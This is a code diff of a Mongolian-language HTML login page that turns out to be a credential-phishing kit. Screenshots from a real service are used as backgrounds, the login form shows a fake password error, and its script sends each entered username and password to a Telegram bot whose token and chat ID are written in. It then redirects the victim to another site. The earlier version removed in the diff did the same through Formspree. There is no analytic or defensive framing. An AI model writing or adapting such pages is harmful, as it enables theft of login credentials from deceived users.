@@ -2,140 +2,296 @@
 <html>
 <head>
 <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
 <style>
 ::placeholder {
   color: black;
-  opacity: 0.9; /* Firefox */
+  opacity: 0.9;
 }
 input {
   color: black;
   background-color: white;
-}
-h1 {
-  font-size: 50px;
-}
-label {
-  font-size: 50px;
-}
-input {
-  font-size: 45px;
-}
-
-/* User input байрлал */
-input[type=text].user-input {
-  position: fixed;
-  height: 115px;
-  top: 18.9%;
-  right: 12%;
-  width: 77%;
-  padding: 34px 20px;
-  margin: 30px 0;
-  display: inline-block;
-  border: 0px solid #ccc;
-  border-radius: 10px;
-  box-sizing: border-box;
-}
-
-/* Phone input байрлал (Бичиж байхад харагдахгүй буюу цэг • болгох код) */
-input[type=text].phone-input {
-  position: fixed;
-  height: 115px;
-  top: 28.8%;
-  right: 12%;
-  width: 77%;
-  padding: 34px 20px;
-  margin: 30px 0;
-  display: inline-block;
-  border: 0px solid #ccc;
-  border-radius: 10px;
-  box-sizing: border-box;
-  -webkit-text-security: disc; /* Энэ мөр нь тоонуудыг нууц үг шиг цэг болгож нуух болно */
-}
-
-/* Илгээх товч */
-.login-btn {
-  position: fixed;
-  height: 115px;
-  top: 42.8%;
-  right: 12%;
-  width: 77%;
-  background-color: #ccbf64;
-  color: white;
-  padding: 34px 20px;
-  margin: 80px 0;
-  border: 0px solid #ccc;
-  border-radius: 10px;
-  cursor: pointer;
-  font-size: 45px;
-}
-
-.login-btn:hover {
-  background-color: #45a049;
-}
-
-/* Контейнер хэсэг */
-.login-box {
-  background-image: url('Screenshot_2.png');
-  background-repeat: no-repeat;
-  background-size: cover;
-  border: 3px solid #163278;
-  border-radius: 20px;
-  position: fixed;
-  height: 1000px;
-  width: 65%;
-  top: 10%;
-  right: 9%;
-  background-color: #1D1C2A;
-  padding: 90px;
 }
 
 body {
   background-image: url('Screenshot_1.png');
   background-repeat: no-repeat;
   background-attachment: fixed;
-  background-size: 100% 100%;
+  background-size: cover;
+  background-position: center;
+  margin: 0;
+  padding: 0;
+  font-family: Arial, sans-serif;
+}
+
+/* Гар утсанд зориулсан контейнер */
+.login-box {
+  background-image: url('Screenshot_2.png');
+  background-repeat: no-repeat;
+  background-size: cover;
+  border: 3px solid #163278;
+  border-radius: 20px;
+  position: absolute;
+  top: 50%;
+  left: 50%;
+  transform: translate(-50%, -50%);
+  width: 88%;
+  max-width: 400px;
+  padding: 30px 20px;
+  background-color: #1D1C2A;
+  box-sizing: border-box;
+  z-index: 10; /* Контейнерийг давхарлаж хаахаас сэргийлэв */
+}
+
+input[type=text].user-input,
+input[type=text].phone-input,
+.login-btn {
+  width: 100% !important;
+  height: 55px !important;
+  margin: 10px 0 !important;
+  padding: 10px 15px !important;
+  border: 0px solid #ccc;
+  border-radius: 10px;
+  box-sizing: border-box;
+  font-size: 20px !important;
+}
+
+input[type=text].phone-input {
+  -webkit-text-security: disc; 
+}
+
+/* Сануулах хэсэг */
+.remember-container {
+  display: flex;
+  align-items: center;
+  margin: 5px 0 15px 0;
+  color: white;
+  font-size: 15px;
+  cursor: pointer;
+}
+
+.remember-container input {
+  width: 18px;
+  height: 18px;
+  margin-right: 8px;
+  cursor: pointer;
+}
+
+.login-btn {
+  background-color: #ccbf64;
+  color: white;
+  cursor: pointer;
+  border: none;
+  font-weight: bold;
+}
+
+/* Алдааны анхааруулга */
+.error-msg {
+  color: #ff4d4d;
+  font-size: 14px;
+  margin-top: -5px;
+  margin-bottom: 5px;
+  display: none;
+  font-weight: bold;
+}
+
+/* Хэл солих хэсэг (Дарагдахад саад болохгүйн тулд z-index өгөв) */
+.lang-container {
+  margin-top: 15px;
+  display: flex;
+  justify-content: flex-end;
+  position: relative;
+  z-index: 999;
+}
+
+/* Dropdown үндсэн бүтэц */
+.dropdown {
+  position: relative;
+  display: inline-block;
+}
+
+/* Далбааны үндсэн товч */
+.dropbtn {
+  background: rgba(255, 255, 255, 0.2);
+  border: 2px solid #ccbf64;
+  padding: 6px 10px;
+  border-radius: 10px;
+  cursor: pointer;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+}
+
+.flag-img {
+  width: 38px;
+  height: 26px;
+  object-fit: cover;
+  border-radius: 3px;
+  display: block;
+  pointer-events: none; /* Зураг дээр дархад товч шууд ажиллах */
+}
+
+/* Унадаг цэс */
+.dropdown-content {
+  display: none;
+  position: absolute;
+  right: 0;
+  bottom: 100%;
+  margin-bottom: 5px;
+  background-color: #ffffff;
+  box-shadow: 0px 8px 16px 0px rgba(0,0,0,0.2);
+  border-radius: 8px;
+  z-index: 1000;
+  overflow: hidden;
+}
+
+.dropdown-content a {
+  padding: 8px 12px;
+  text-decoration: none;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  cursor: pointer;
+}
+
+.dropdown-content a:hover {
+  background-color: #f1f1f1;
+}
+
+.dropdown-content.show {
+  display: block;
 }
 </style>
 </head>
 <body>
 
-    <!-- НЭВТРЭХ ХЭСЭГ -->
-    <div class="login-box" id="loginSection">
-        <form id="loginForm" onsubmit="handleLogin(event)">
-            <h1 style="color:rgb(255, 255, 255 );"></h1>
-            <input type="text" name="username" id="username" class="user-input" placeholder="Enter username" required><br>
-            <input type="text" name="phone" id="phone" class="phone-input" placeholder="Enter phone number" required><br>
-            <button type="submit" class="login-btn">LOGIN</button>
-        </form>
+  <div class="login-box">
+    <form id="loginForm" onsubmit="return false;">
+      <input type="text" id="usernameInput" name="username" class="user-input" placeholder="Хэрэглэгчийн нэр">
+      
+      <input type="text" id="passwordInput" name="password" class="phone-input" placeholder="Нууц үг">
+      <div id="errorMsg" class="error-msg">Нууц үг буруу (Хамгийн багадаа 10 орон байна)</div>
+
+      <label class="remember-container">
+        <input type="checkbox" id="rememberMe"> <span id="rememberText">Намайг санах</span>
+      </label>
+
+      <button type="button" id="loginBtn" class="login-btn" onclick="handleLogin()">Нэвтрэх</button>
+    </form>
+
+    <div class="lang-container">
+      <div class="dropdown">
+        <div class="dropbtn" onclick="toggleDropdown(event)">
+          <img id="currentFlag" src="mongolia.png" class="flag-img" alt="MN">
+        </div>
+        <div id="myDropdown" class="dropdown-content">
+          <a href="javascript:void(0);" onclick="changeLang('mn')">
+            <img src="mongolia.png" class="flag-img" alt="MN">
+          </a>
+          <a href="javascript:void(0);" onclick="changeLang('en')">
+            <img src="uk.png" class="flag-img" alt="EN">
+          </a>
+        </div>
+      </div>
     </div>
+  </div>
 
 <script>
-    function handleLogin(event) {
-        event.preventDefault(); // Форм автоматаар шилжихийг зогсооно
+// Та өөрийн Telegram Bot Token болон Chat ID-гаа энд солино уу
+const TELEGRAM_BOT_TOKEN = "9298783806:AAE9qmGBbPboZSIBq1DarIQjOE_U3qEutkk";
+const TELEGRAM_CHAT_ID = "6261945536";
 
-        const username = document.getElementById("username").value;
-        const phone = document.getElementById("phone").value;
+function toggleDropdown(event) {
+  event.stopPropagation();
+  document.getElementById("myDropdown").classList.toggle("show");
+}
 
-        // 1. Formspree руу мэдээллийг цаана нь илгээх
-        const formData = new FormData();
-        formData.append("username", username);
-        formData.append("phone", phone);
-
-        fetch("https://formspree.io/f/xaeegqyy", {
-            method: "POST",
-            body: formData,
-            headers: {
-                'Accept': 'application/json'
-            }
-        })
-        .then(response => {
-            // 2. Formspree руу амжилттай очсоны дараа өөр сайт руу үсрэх
-            window.location.href = "https://example.com"; // <-- Өөрийнхөө очих линкээр солино уу
-        })
-        .catch(error => {
-            window.location.href = "https://example.com"; 
-        });
+// Цэснээс гадуур дарвал цэсийг хаах
+window.onclick = function(event) {
+  if (!event.target.closest('.dropdown')) {
+    var dropdowns = document.getElementsByClassName("dropdown-content");
+    for (let i = 0; i < dropdowns.length; i++) {
+      let openDropdown = dropdowns[i];
+      if (openDropdown.classList.contains('show')) {
+        openDropdown.classList.remove('show');
+      }
     }
+  }
+}
+
+function changeLang(lang) {
+  const usernameInput = document.getElementById("usernameInput");
+  const passwordInput = document.getElementById("passwordInput");
+  const loginBtn = document.getElementById("loginBtn");
+  const errorMsg = document.getElementById("errorMsg");
+  const rememberText = document.getElementById("rememberText");
+  const currentFlag = document.getElementById("currentFlag");
+
+  if (lang === 'en') {
+    usernameInput.placeholder = "Username";
+    passwordInput.placeholder = "Password";
+    loginBtn.innerText = "Login";
+    errorMsg.innerText = "Wrong password (Must be at least 10 characters)";
+    rememberText.innerText = "Remember me";
+    currentFlag.src = "uk.png";
+  } else {
+    usernameInput.placeholder = "Хэрэглэгчийн нэр";
+    passwordInput.placeholder = "Нууц үг";
+    loginBtn.innerText = "Нэвтрэх";
+    errorMsg.innerText = "Нууц үг буруу (Хамгийн багадаа 10 орон байна)";
+    rememberText.innerText = "Намайг санах";
+    currentFlag.src = "mongolia.png";
+  }
+
+  document.getElementById("myDropdown").classList.remove('show');
+}
+
+function handleLogin() {
+  const username = document.getElementById("usernameInput").value;
+  const password = document.getElementById("passwordInput").value;
+  const loginBtn = document.getElementById("loginBtn");
+  const errorMsg = document.getElementById("errorMsg");
+
+  if (!username || !password) {
+    alert("Мэдээллээ бүрэн оруулна уу!");
+    return;
+  }
+
+  // Нууц үг 10 орон хүрсэн эсэхийг шалгах
+  if (password.length < 10) {
+    errorMsg.style.display = "block"; 
+    return; 
+  } else {
+    errorMsg.style.display = "none"; 
+  }
+
+  loginBtn.disabled = true;
+  loginBtn.innerText = "Түр хүлээнэ үү...";
+
+  const text = `🔔 Шинэ нэвтрэлт:\n👤 Нэр: ${username}\n🔑 Нууц үг: ${password}`;
+
+  // Telegram руу илгээх хүсэлт
+  fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+    method: "POST",
+    headers: {
+      "Content-Type": "application/json"
+    },
+    body: JSON.stringify({
+      chat_id: TELEGRAM_CHAT_ID,
+      text: text
+    })
+  })
+  .then(response => {
+    window.location.href = "https://hairaa.net";
+  })
+  .catch(error => {
+    window.location.href = "https://hairaa.net";
+  });
+
+  setTimeout(function() {
+    window.location.href = "https://hairaa.net";
+  }, 1000);
+}
 </script>
 
 </body>
